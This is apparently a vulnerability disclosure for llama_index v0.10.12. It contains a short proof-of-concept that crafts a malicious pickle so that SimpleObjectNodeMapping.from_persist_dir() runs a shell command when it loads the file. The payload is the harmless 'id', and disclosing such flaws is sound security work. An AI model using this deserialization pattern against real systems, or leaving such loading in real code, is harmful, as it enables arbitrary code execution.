v0.10.12
PoC:
```
import pickle
import os
 
class test():
    def __reduce__(self):
        command=r"id"
        return (os.system,(command,))

with open('./storage/object_node_mapping.pickle', 'wb') as f:
   pickle.dump(test(), f)


from llama_index.core.objects.base_node_mapping import SimpleObjectNodeMapping
node_mapping = SimpleObjectNodeMapping.from_persist_dir()
```
`SimpleObjectNodeMapping.from_persist_dir()` loads an unsafe pickle file downloaded from the Internet, causing a command execution error.
